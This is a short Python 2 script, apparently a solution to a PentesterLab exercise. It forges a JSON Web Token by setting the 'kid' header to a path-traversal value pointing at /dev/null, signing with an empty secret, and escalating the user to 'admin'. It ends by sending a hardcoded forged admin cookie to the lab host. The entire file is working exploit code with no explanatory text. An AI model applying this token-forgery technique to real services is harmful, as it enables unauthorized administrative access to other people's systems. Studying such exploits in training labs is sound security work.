import requests
import hmac
import hashlib
import base64

response = requests.get("http://ptl-91c92d25-b0933e9e.libcurl.so")
cookie = response.headers['Set-Cookie']
token = cookie.split(';')[0].split('=')[1].strip()
header_enc,payload_enc,signature_enc = token.split('.')

header = base64.b64decode(header_enc+"==")
payload = base64.b64decode(payload_enc+"==")

print "old: ",header, payload 

kid = "../../../../../../../../dev/null"

header = header.replace("0001",kid);
header_enc = base64.b64encode(header).replace('=','')

payload = payload.replace("null",'"admin"')
payload_enc = base64.b64encode(payload).replace('=','')

print "new: ",header,payload

secret = ""

signature_enc =  base64.urlsafe_b64encode( hmac.new(secret,header_enc+'.'+payload_enc, hashlib.sha256).digest())

new_token = header_enc+'.'+payload_enc+'.'+signature_enc.replace('=','')

headers = {"Cookie":"auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4ifQ.J56uB--4xhv8WuIaTmjevXEGLCQ7YSmrKIhFmfD3mY8"}

response = requests.get("http://ptl-91c92d25-b0933e9e.libcurl.so/",headers = headers)
print response.text
